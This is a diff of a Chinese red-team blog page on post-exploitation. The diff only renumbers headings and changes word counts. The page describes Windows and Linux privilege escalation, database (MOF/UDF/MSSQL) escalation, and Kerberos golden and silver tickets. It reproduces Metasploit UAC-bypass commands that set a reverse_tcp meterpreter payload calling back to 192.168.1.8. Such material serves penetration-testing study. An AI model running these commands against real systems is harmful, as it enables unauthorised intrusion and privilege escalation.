@@ -8,11 +8,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
     <title>hvv_后渗透 - Sc0fie1d-Blog</title><meta name="Description" content="The official documentation for the Hugo DoIt theme"><meta property="og:title" content="hvv_后渗透" />
-<meta property="og:description" content="1 权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。
-1.1 windows提权Windows常见权限分类：
-1 2 3 * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.1.1 1.提权辅助脚本 1 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 1.1.2 2.msf提权1.1.2.1 2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限
+<meta property="og:description" content="权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。
+windows提权Windows常见权限分类：
+1 2 3 * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 1 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限
 （权限为Administrator时大概率会成功，其他可能需要绕UAC）
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 1." />
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://scofield1920.github.io/hvv_post_penetration/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
 
@@ -22,11 +22,11 @@
 <meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
 
 <meta name="twitter:title" content="hvv_后渗透"/>
-<meta name="twitter:description" content="1 权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。
-1.1 windows提权Windows常见权限分类：
-1 2 3 * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.1.1 1.提权辅助脚本 1 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 1.1.2 2.msf提权1.1.2.1 2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限
+<meta name="twitter:description" content="权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。
+windows提权Windows常见权限分类：
+1 2 3 * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 1 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限
 （权限为Administrator时大概率会成功，其他可能需要绕UAC）
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 1."/>
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2."/>
 <meta name="application-name" content="DoIt">
 <meta name="apple-mobile-web-app-title" content="DoIt">
 
@@ -44,7 +44,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/scofield1920.github.io\/hvv_post_penetration\/"
-        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "penetration, web, hvv","wordcount":  1691 ,
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "penetration, web, hvv","wordcount":  1638 ,
         "url": "http:\/\/scofield1920.github.io\/hvv_post_penetration\/","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -266,7 +266,7 @@
             <div class="post-meta-line">
                 <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">scofied_lee</a>
                 </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/penetration/"><i class="far fa-folder fa-fw"></i>penetration</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a>&nbsp;<a href="/categories/hvv/"><i class="far fa-folder fa-fw"></i>hvv</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1691 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;8 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1638 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;8 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -377,9 +377,9 @@
   </ul>
 </nav></div>
             </div><div class="content" id="content"><h2 id="权限提升" class="headerLink">
-    <a href="#%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87" class="header-mark"></a>1 权限提升</h2><p>通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。</p>
+    <a href="#%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87" class="header-mark"></a>权限提升</h2><p>通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。</p>
 <h3 id="windows提权" class="headerLink">
-    <a href="#windows%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1 windows提权</h3><p>Windows常见权限分类：</p>
+    <a href="#windows%e6%8f%90%e6%9d%83" class="header-mark"></a>windows提权</h3><p>Windows常见权限分类：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -393,7 +393,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="1提权辅助脚本" class="headerLink">
-    <a href="#1%e6%8f%90%e6%9d%83%e8%be%85%e5%8a%a9%e8%84%9a%e6%9c%ac" class="header-mark"></a>1.1.1 1.提权辅助脚本</h4><div class="highlight"><div class="chroma">
+    <a href="#1%e6%8f%90%e6%9d%83%e8%be%85%e5%8a%a9%e8%84%9a%e6%9c%ac" class="header-mark"></a>1.提权辅助脚本</h4><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -402,8 +402,8 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="2msf提权" class="headerLink">
-    <a href="#2msf%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2 2.msf提权</h4><h5 id="21-msf绕过uac提权" class="headerLink">
-    <a href="#21-msf%e7%bb%95%e8%bf%87uac%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2.1 2.1 msf绕过UAC提权</h5><p>一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限</p>
+    <a href="#2msf%e6%8f%90%e6%9d%83" class="header-mark"></a>2.msf提权</h4><h5 id="21-msf绕过uac提权" class="headerLink">
+    <a href="#21-msf%e7%bb%95%e8%bf%87uac%e6%8f%90%e6%9d%83" class="header-mark"></a>2.1 msf绕过UAC提权</h5><p>一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限</p>
 <p>（权限为Administrator时大概率会成功，其他可能需要绕UAC）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -454,7 +454,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="22-suggester辅助脚本提权" class="headerLink">
-    <a href="#22-suggester%e8%be%85%e5%8a%a9%e8%84%9a%e6%9c%ac%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2.2 2.2 suggester辅助脚本提权</h5><p>会话派发到msf</p>
+    <a href="#22-suggester%e8%be%85%e5%8a%a9%e8%84%9a%e6%9c%ac%e6%8f%90%e6%9d%83" class="header-mark"></a>2.2 suggester辅助脚本提权</h5><p>会话派发到msf</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
@@ -710,7 +710,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="23-烂土豆提权提权" class="headerLink">
-    <a href="#23-%e7%83%82%e5%9c%9f%e8%b1%86%e6%8f%90%e6%9d%83%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2.3 2.3 烂土豆提权提权</h5><p>**适用版本：**Windows 7、8、10、2008、2012</p>
+    <a href="#23-%e7%83%82%e5%9c%9f%e8%b1%86%e6%8f%90%e6%9d%83%e6%8f%90%e6%9d%83" class="header-mark"></a>2.3 烂土豆提权提权</h5><p>**适用版本：**Windows 7、8、10、2008、2012</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -720,7 +720,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="24-dll劫持提权" class="headerLink">
-    <a href="#24-dll%e5%8a%ab%e6%8c%81%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2.4 2.4 DLL劫持提权</h5><p>使用msf生成一个DLL，替换掉应用的dll，等待应用重启（需要提前在本地测试）</p>
+    <a href="#24-dll%e5%8a%ab%e6%8c%81%e6%8f%90%e6%9d%83" class="header-mark"></a>2.4 DLL劫持提权</h5><p>使用msf生成一个DLL，替换掉应用的dll，等待应用重启（需要提前在本地测试）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -730,9 +730,9 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="25-令牌窃取提权" class="headerLink">
-    <a href="#25-%e4%bb%a4%e7%89%8c%e7%aa%83%e5%8f%96%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2.5 2.5 令牌窃取提权</h5><p>拿到session用meterpreter模块</p>
+    <a href="#25-%e4%bb%a4%e7%89%8c%e7%aa%83%e5%8f%96%e6%8f%90%e6%9d%83" class="header-mark"></a>2.5 令牌窃取提权</h5><p>拿到session用meterpreter模块</p>
 <h4 id="3psexec提权" class="headerLink">
-    <a href="#3psexec%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.3 3.psexec提权</h4><p>win2003&amp;win2008</p>
+    <a href="#3psexec%e6%8f%90%e6%9d%83" class="header-mark"></a>3.psexec提权</h4><p>win2003&amp;win2008</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -744,7 +744,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="4注册表提权" class="headerLink">
-    <a href="#4%e6%b3%a8%e5%86%8c%e8%a1%a8%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.4 4.注册表提权</h4><p>用accesschk.exe检测regsvc注册表可以知道当前用户权限发现是可修改的</p>
+    <a href="#4%e6%b3%a8%e5%86%8c%e8%a1%a8%e6%8f%90%e6%9d%83" class="header-mark"></a>4.注册表提权</h4><p>用accesschk.exe检测regsvc注册表可以知道当前用户权限发现是可修改的</p>
 <p>通过修改注册表路径指向我们的反弹文件然后获得一个更高权限</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -775,8 +775,8 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="linux提权" class="headerLink">
-    <a href="#linux%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2 Linux提权</h3><h4 id="1-内核溢出提权" class="headerLink">
-    <a href="#1-%e5%86%85%e6%a0%b8%e6%ba%a2%e5%87%ba%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.1 1 内核溢出提权</h4><ul>
+    <a href="#linux%e6%8f%90%e6%9d%83" class="header-mark"></a>Linux提权</h3><h4 id="1-内核溢出提权" class="headerLink">
+    <a href="#1-%e5%86%85%e6%a0%b8%e6%ba%a2%e5%87%ba%e6%8f%90%e6%9d%83" class="header-mark"></a>1 内核溢出提权</h4><ul>
 <li>
 <p>uname -a 查看系统版本和内核信息</p>
 </li>
@@ -793,7 +793,7 @@
 </div></li>
 </ul>
 <h4 id="2sudo提权" class="headerLink">
-    <a href="#2sudo%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.2 2.sudo提权</h4><div class="highlight"><div class="chroma">
+    <a href="#2sudo%e6%8f%90%e6%9d%83" class="header-mark"></a>2.sudo提权</h4><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -824,7 +824,7 @@
 </div>
 </div><p>其他漏洞CVE-2019-14287、CVE-2021-3156</p>
 <h4 id="3suid提权" class="headerLink">
-    <a href="#3suid%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.3 3.suid提权</h4><p>① 查找具有suid权限文件：</p>
+    <a href="#3suid%e6%8f%90%e6%9d%83" class="header-mark"></a>3.suid提权</h4><p>① 查找具有suid权限文件：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -886,7 +886,7 @@ Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运�
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="4su" class="headerLink">
-    <a href="#4su" class="header-mark"></a>1.2.4 4.su</h4><div class="highlight"><div class="chroma">
+    <a href="#4su" class="header-mark"></a>4.su</h4><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -903,7 +903,7 @@ Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运�
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="5任务计划" class="headerLink">
-    <a href="#5%e4%bb%bb%e5%8a%a1%e8%ae%a1%e5%88%92" class="header-mark"></a>1.2.5 5.任务计划</h4><div class="highlight"><div class="chroma">
+    <a href="#5%e4%bb%bb%e5%8a%a1%e8%ae%a1%e5%88%92" class="header-mark"></a>5.任务计划</h4><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -916,7 +916,7 @@ Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运�
 </div><p>在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升；
 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权；</p>
 <h4 id="6覆盖passwd提权" class="headerLink">
-    <a href="#6%e8%a6%86%e7%9b%96passwd%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.6 6.覆盖passwd提权</h4><div class="highlight"><div class="chroma">
+    <a href="#6%e8%a6%86%e7%9b%96passwd%e6%8f%90%e6%9d%83" class="header-mark"></a>6.覆盖passwd提权</h4><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -949,7 +949,7 @@ Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运�
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="7ssh密钥提权" class="headerLink">
-    <a href="#7ssh%e5%af%86%e9%92%a5%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.7 7.ssh密钥提权</h4><div class="highlight"><div class="chroma">
+    <a href="#7ssh%e5%af%86%e9%92%a5%e6%8f%90%e6%9d%83" class="header-mark"></a>7.ssh密钥提权</h4><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -964,7 +964,7 @@ Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运�
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="8john破解shadow-root密文登陆提权" class="headerLink">
-    <a href="#8john%e7%a0%b4%e8%a7%a3shadow-root%e5%af%86%e6%96%87%e7%99%bb%e9%99%86%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.8 8.john破解shadow root密文登陆提权</h4><p>john会自动检测密文类型 &ndash;wordlist 字段文件</p>
+    <a href="#8john%e7%a0%b4%e8%a7%a3shadow-root%e5%af%86%e6%96%87%e7%99%bb%e9%99%86%e6%8f%90%e6%9d%83" class="header-mark"></a>8.john破解shadow root密文登陆提权</h4><p>john会自动检测密文类型 &ndash;wordlist 字段文件</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -983,7 +983,7 @@ Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运�
             alt="image-20230717154906354">
     </a></figure></p>
 <h4 id="9ubuntu计划任务反弹shell提权" class="headerLink">
-    <a href="#9ubuntu%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e5%8f%8d%e5%bc%b9shell%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.9 9.Ubuntu计划任务反弹shell提权</h4><div class="highlight"><div class="chroma">
+    <a href="#9ubuntu%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1%e5%8f%8d%e5%bc%b9shell%e6%8f%90%e6%9d%83" class="header-mark"></a>9.Ubuntu计划任务反弹shell提权</h4><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1045,8 +1045,8 @@ Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运�
             alt="image-20230717155442919">
     </a></figure></p>
 <h3 id="数据库提权" class="headerLink">
-    <a href="#%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83" class="header-mark"></a>1.3 数据库提权</h3><h4 id="1mof提权" class="headerLink">
-    <a href="#1mof%e6%8f%90%e6%9d%83" class="header-mark"></a>1.3.1 1.MOF提权</h4><p>MySQL数据库，Windows&lt;=2003</p>
+    <a href="#%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83" class="header-mark"></a>数据库提权</h3><h4 id="1mof提权" class="headerLink">
+    <a href="#1mof%e6%8f%90%e6%9d%83" class="header-mark"></a>1.MOF提权</h4><p>MySQL数据库，Windows&lt;=2003</p>
 <p>MOF文件既然每五秒就会执行，而且是系统权限；</p>
 <p>我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件；</p>
 <p>然后系统每隔五秒就会执行一次我们上传的MOF。</p>
@@ -1109,15 +1109,15 @@ Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运�
 </div>
 </div><p>（通常使用msf自带的mof模块来实现提权）</p>
 <h4 id="2udf提权" class="headerLink">
-    <a href="#2udf%e6%8f%90%e6%9d%83" class="header-mark"></a>1.3.2 2.UDF提权</h4><p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限</p>
+    <a href="#2udf%e6%8f%90%e6%9d%83" class="header-mark"></a>2.UDF提权</h4><p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限</p>
 <p><a href="https://blog.csdn.net/qq_43430261/article/details/107258466" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/qq_43430261/article/details/107258466</a></p>
 <h4 id="3mssql提权" class="headerLink">
-    <a href="#3mssql%e6%8f%90%e6%9d%83" class="header-mark"></a>1.3.3 3.Mssql提权</h4><p>mssql提权主要分为<strong>弱口令</strong>与<strong>溢出</strong>两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。</p>
+    <a href="#3mssql%e6%8f%90%e6%9d%83" class="header-mark"></a>3.Mssql提权</h4><p>mssql提权主要分为<strong>弱口令</strong>与<strong>溢出</strong>两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。</p>
 <p>通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的
 mssql一般是允许远程连接的
 系统库是master</p>
 <h2 id="白银票据和黄金票据" class="headerLink">
-    <a href="#%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae%e5%92%8c%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae" class="header-mark"></a>2 白银票据和黄金票据</h2><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717170328370.png" title="image-20230717170328370" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717170328370.png">
+    <a href="#%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae%e5%92%8c%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae" class="header-mark"></a>白银票据和黄金票据</h2><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717170328370.png" title="image-20230717170328370" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717170328370.png">
         <img
             
             loading="lazy"
@@ -1129,12 +1129,12 @@ mssql一般是允许远程连接的
 <p><a href="https://www.ctfiot.com/74435.html" target="_blank" rel="noopener noreferrer">九维团队-红队（突破）| 黄金白银票据攻击与防御 | CTF导航 (ctfiot.com)</a></p>
 <p><a href="https://www.cnblogs.com/1-Ry/p/15418602.html" target="_blank" rel="noopener noreferrer">黄金票据、白银票据 - 1_Ry - 博客园 (cnblogs.com)</a></p>
 <h3 id="kerberos认证流程" class="headerLink">
-    <a href="#kerberos%e8%ae%a4%e8%af%81%e6%b5%81%e7%a8%8b" class="header-mark"></a>2.1 Kerberos认证流程</h3><p>Client 与 AS 的交互,</p>
+    <a href="#kerberos%e8%ae%a4%e8%af%81%e6%b5%81%e7%a8%8b" class="header-mark"></a>Kerberos认证流程</h3><p>Client 与 AS 的交互,</p>
 <p>Client 与 TGS 的交互,
 Client 与 Server 的交互。</p>
 <p>黄金票据是伪造TGT，白银票据则是伪造ST</p>
 <h3 id="黄金票据" class="headerLink">
-    <a href="#%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae" class="header-mark"></a>2.2 黄金票据</h3><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个
+    <a href="#%e9%bb%84%e9%87%91%e7%a5%a8%e6%8d%ae" class="header-mark"></a>黄金票据</h3><p>在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个
 Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p>
 <p><strong>所需条件:</strong></p>
 <p>1、域名称</p>
@@ -1143,7 +1143,7 @@ Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的
 <p>4、伪造任意用户名</p>
 <p>（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）</p>
 <h3 id="白银票据" class="headerLink">
-    <a href="#%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae" class="header-mark"></a>2.3 白银票据</h3><p>白银票据就是伪造的ST。
+    <a href="#%e7%99%bd%e9%93%b6%e7%a5%a8%e6%8d%ae" class="header-mark"></a>白银票据</h3><p>白银票据就是伪造的ST。
 在Kerberos认证的第三部，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。
 所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作</p>
 <p><strong>所需条件:</strong></p>
@@ -1154,18 +1154,18 @@ Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的
 5.服务账号的NTML HASH
 6.需要伪造的用户名</p>
 <h3 id="不同点" class="headerLink">
-    <a href="#%e4%b8%8d%e5%90%8c%e7%82%b9" class="header-mark"></a>2.4 不同点</h3><h4 id="获取的权限不同" class="headerLink">
-    <a href="#%e8%8e%b7%e5%8f%96%e7%9a%84%e6%9d%83%e9%99%90%e4%b8%8d%e5%90%8c" class="header-mark"></a>2.4.1 <strong>获取的权限不同</strong>:</h4><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限
+    <a href="#%e4%b8%8d%e5%90%8c%e7%82%b9" class="header-mark"></a>不同点</h3><h4 id="获取的权限不同" class="headerLink">
+    <a href="#%e8%8e%b7%e5%8f%96%e7%9a%84%e6%9d%83%e9%99%90%e4%b8%8d%e5%90%8c" class="header-mark"></a><strong>获取的权限不同</strong>:</h4><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限
 银票：伪造的ST，只能访问指定的服务，如CIFS</p>
 <h4 id="认证流程不同" class="headerLink">
-    <a href="#%e8%ae%a4%e8%af%81%e6%b5%81%e7%a8%8b%e4%b8%8d%e5%90%8c" class="header-mark"></a>2.4.2 <strong>认证流程不同</strong></h4><p>金票：同KDC交互，但不同AS交互
+    <a href="#%e8%ae%a4%e8%af%81%e6%b5%81%e7%a8%8b%e4%b8%8d%e5%90%8c" class="header-mark"></a><strong>认证流程不同</strong></h4><p>金票：同KDC交互，但不同AS交互
 银票：不同KDC交互，直接访问Server</p>
 <h4 id="加密方式不同" class="headerLink">
